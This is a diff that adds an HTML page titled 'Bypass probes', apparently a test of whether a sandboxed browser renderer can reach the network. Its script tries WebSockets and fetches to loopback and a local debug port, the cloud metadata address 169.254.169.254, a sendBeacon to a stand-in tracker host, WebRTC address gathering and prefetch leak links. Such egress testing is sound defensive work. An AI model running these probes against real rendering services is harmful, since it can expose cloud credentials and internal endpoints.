@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="sv"><head><meta charset="utf-8"><title>Bypass probes</title>
+<link rel="dns-prefetch" href="//dns-prefetch-leak.example">
+<link rel="preconnect" href="http://preconnect-leak.example">
+<link rel="prefetch" href="http://prefetch-leak.example/x">
+</head>
+<body><pre id="results"></pre>
+<script>
+const out = {};
+const report = (k, v) => { out[k] = String(v); document.getElementById('results').textContent = JSON.stringify(out, null, 1); };
+const params = new URLSearchParams(location.search);
+const wsPath = params.get('wspath') || '/';
+const timeout = (p, ms, label) => Promise.race([p, new Promise(r => setTimeout(() => r(label || 'timeout'), ms))]);
+
+function ws(url) {
+  return timeout(new Promise(resolve => {
+    let s;
+    try { s = new WebSocket(url); } catch (e) { return resolve('throw ' + e.name); }
+    s.onopen = () => resolve('OPEN');
+    s.onerror = () => resolve('error');
+    s.onclose = e => resolve('close ' + e.code);
+  }), 4000);
+}
+
+async function run() {
+  report('ws_site', await ws('ws://site.test/ws'));
+  report('ws_runserver_loopback', await ws('ws://127.0.0.1:3000' + wsPath));
+  report('ws_runserver_name', await ws('ws://renderer:3000' + wsPath));
+  report('fetch_runserver_loopback', await timeout(fetch('http://127.0.0.1:3000/json').then(r => 'status ' + r.status, e => 'error ' + e.name), 4000));
+  report('fetch_metadata_ip', await timeout(fetch('http://169.254.169.254/latest/meta-data/').then(r => 'status ' + r.status, e => 'error ' + e.name), 4000));
+  report('fetch_public_ip', await timeout(fetch('http://1.1.1.1/').then(r => 'status ' + r.status, e => 'error ' + e.name), 4000));
+  report('beacon', navigator.sendBeacon('http://tracker.test/beacon', 'data') ? 'queued' : 'refused');
+  report('sw', await timeout(('serviceWorker' in navigator)
+    ? navigator.serviceWorker.register('/sw.js').then(() => 'REGISTERED', e => 'error ' + e.name)
+    : Promise.resolve('no serviceWorker API'), 4000));
+  report('worker_fetch', await timeout(new Promise(resolve => {
+    const w = new Worker('/worker.js'); w.onmessage = e => resolve(e.data); w.onerror = e => resolve('error ' + e.message);
+  }), 4000));
+  report('webrtc', await timeout(new Promise(resolve => {
+    try {
+      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:1.1.1.1:3478' }] });
+      const types = [];
+      pc.onicecandidate = e => { if (e.candidate) types.push(e.candidate.type + ':' + e.candidate.address); else resolve('done ' + JSON.stringify(types)); };
+      pc.createDataChannel('x');
+      pc.createOffer().then(o => pc.setLocalDescription(o));
+    } catch (e) { resolve('throw ' + e); }
+  }), 6000, 'gathering-timeout'));
+  report('eventsource', await timeout(new Promise(resolve => {
+    const es = new EventSource('http://api.test/sse'); es.onopen = () => resolve('OPEN'); es.onerror = () => { es.close(); resolve('error'); };
+  }), 4000));
+  report('done', 'yes');
+}
+run();
+</script></body></html>
